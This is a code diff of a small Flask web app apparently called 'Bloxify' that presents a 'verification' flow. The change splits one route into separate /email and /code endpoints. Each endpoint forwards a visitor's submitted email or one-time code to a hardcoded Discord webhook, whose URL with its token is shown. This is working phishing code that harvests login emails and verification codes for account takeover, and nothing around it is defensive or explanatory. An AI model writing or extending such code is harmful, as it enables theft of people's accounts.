@@ -9,28 +9,21 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1458185599688114309/X9TaZmu-EfBW
 def home():
     return render_template("index.html")
 
-@app.route("/submit", methods=["POST"])
-def submit():
+@app.route("/email", methods=["POST"])
+def email():
     data = request.json or {}
+    requests.post(WEBHOOK_URL, json={
+        "content": f"📧 **Email submitted:** {data.get('email')}"
+    })
+    return jsonify(ok=True)
 
-    payload = {
-        "username": "Bloxify",
-        "embeds": [{
-            "title": "New Verification",
-            "color": 0x2f3136,
-            "fields": [
-                {"name": "Email", "value": data.get("email", "N/A"), "inline": False},
-                {"name": "Code", "value": data.get("code", "N/A"), "inline": False}
-            ]
-        }]
-    }
-
-    try:
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
-    except Exception as e:
-        print("Webhook error:", e)
-
-    return jsonify({"ok": True})
+@app.route("/code", methods=["POST"])
+def code():
+    data = request.json or {}
+    requests.post(WEBHOOK_URL, json={
+        "content": f"🔢 **Code submitted:** {data.get('code')}"
+    })
+    return jsonify(ok=True)
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
